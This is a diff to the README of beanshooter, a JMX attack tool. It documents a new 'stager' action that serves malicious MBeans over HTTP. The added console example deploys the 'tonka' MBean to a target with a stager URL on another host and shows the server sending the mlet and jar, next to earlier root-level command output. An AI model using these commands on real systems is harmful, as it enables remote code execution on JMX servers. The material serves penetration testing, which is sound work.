@@ -25,6 +25,7 @@
     - [enum](#enum)
     - [list](#list)
     - [serial](#serial)
+    - [stager](#stager)
     - [undeploy](#undeploy)
   + [MBean Operations](#mbean-operations)
     - [generic](#generic-mbean-operations)
@@ -101,6 +102,7 @@ positional arguments:
     enum                 enumerate the JMX service for common vulnerabilities
     list                 list available MBEans on the remote MBean server
     serial               perform a deserialization attack
+    stager               start a stager server to deliver MBeans
     undeploy             undeploys the specified MBEAN from the JMX server
 
  MBean Operations
@@ -328,6 +330,38 @@ uid=0(root) gid=0(root) groups=0(root)
 [...]
 id
 uid=0(root) gid=0(root) groups=0(root)
+```
+
+#### Stager
+
+The `stager` action starts a stager server that can be used to deliver *MBeans*. Creating a stager server
+for *MBean* delivery is normally done automatically when using *beanshooters* `deploy` action. However,
+sometimes it is required to use a standalone server. When using the `stager` action, you can either specify
+the name of a builtin *MBean* to deliver or the keyword `custom`. If `custom` was specified, the `--class-name`,
+`--object-name` and `--jar-file` options are required.
+
+```console
+[qtc@devbox ~]$ beanshooter tonka deploy 172.17.0.2 9010 --stager-url http://172.17.0.1:8888 --no-stager
+[qtc@devbox ~]$ beanshooter stager 172.17.0.1 8888 tonka
+[+] Creating HTTP server on: 172.17.0.1:8888
+[+] Creating MLetHandler for endpoint: /
+[+] Creating JarHandler for endpoint: /93691b8bae4143f087f7a3123641b20d
+[+] Starting HTTP server.
+[+] 
+[+] Press Enter to stop listening.
+[+]
+[+] Incoming request from: iinsecure.dev
+[+] Requested resource: /
+[+] Sending mlet:
+[+]
+[+] 	Class:     de.qtc.beanshooter.tonkabean.TonkaBean
+[+] 	Archive:   93691b8bae4143f087f7a3123641b20d
+[+] 	Object:    MLetTonkaBean:name=TonkaBean,id=1
+[+] 	Codebase:  http://172.17.0.1:8888
+[+]
+[+] Incoming request from: iinsecure.dev
+[+] Requested resource: /93691b8bae4143f087f7a3123641b20d
+[+] Sending jar file with md5sum: 6568ffb2934cb978dbd141848b8b128a
 ```
 
 #### Undeploy
